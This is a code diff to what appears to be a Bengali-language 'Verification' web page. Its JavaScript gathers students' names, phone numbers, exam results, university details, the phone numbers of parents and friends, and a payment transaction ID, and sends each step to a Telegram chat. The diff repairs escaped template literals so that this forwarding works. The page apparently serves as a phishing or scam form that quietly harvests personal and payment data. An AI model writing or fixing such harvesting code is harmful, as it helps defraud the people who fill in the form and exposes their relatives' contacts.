@@ -1196,20 +1196,20 @@
     const friend  = document.getElementById('s1-friend').value.trim();
 
     await sendToTelegram(
-\`📋 *Verification — ধাপ ১ (ব্যক্তিগত তথ্য)*
+`📋 *Verification — ধাপ ১ (ব্যক্তিগত তথ্য)*
 
-👤 নাম: \${name}
-📱 নম্বর: \${phone}
-🏫 স্কুল: \${school || '—'}
-🎓 কলেজ: \${college || '—'}
-📊 SSC Result: \${ssc || '—'}
-📊 HSC Result: \${hsc || '—'}
-🏛️ বিশ্ববিদ্যালয়: \${uni || '—'}
-📚 বিষয়: \${subject || '—'}
-🔢 CGPA: \${cgpa || '—'}
-👨‍👩 অভিভাবক: \${pname || '—'}
-📞 অভিভাবকের নম্বর: \${pphone || '—'}
-👫 বন্ধুর নম্বর: \${friend || '—'}\`
+👤 নাম: ${name}
+📱 নম্বর: ${phone}
+🏫 স্কুল: ${school || '—'}
+🎓 কলেজ: ${college || '—'}
+📊 SSC Result: ${ssc || '—'}
+📊 HSC Result: ${hsc || '—'}
+🏛️ বিশ্ববিদ্যালয়: ${uni || '—'}
+📚 বিষয়: ${subject || '—'}
+🔢 CGPA: ${cgpa || '—'}
+👨‍👩 অভিভাবক: ${pname || '—'}
+📞 অভিভাবকের নম্বর: ${pphone || '—'}
+👫 বন্ধুর নম্বর: ${friend || '—'}`
     );
 
     document.getElementById('step1').classList.remove('active');
@@ -1234,11 +1234,11 @@
     const phone = document.getElementById('s1-phone').value.trim();
 
     await sendToTelegram(
-\`💳 *Verification — ধাপ ২ (Payment)*
+`💳 *Verification — ধাপ ২ (Payment)*
 
-👤 নাম: \${name}
-📱 নম্বর: \${phone}
-🔖 Transaction ID: \${txn}\`
+👤 নাম: ${name}
+📱 নম্বর: ${phone}
+🔖 Transaction ID: ${txn}`
     );
 
     document.getElementById('step2').classList.remove('active');
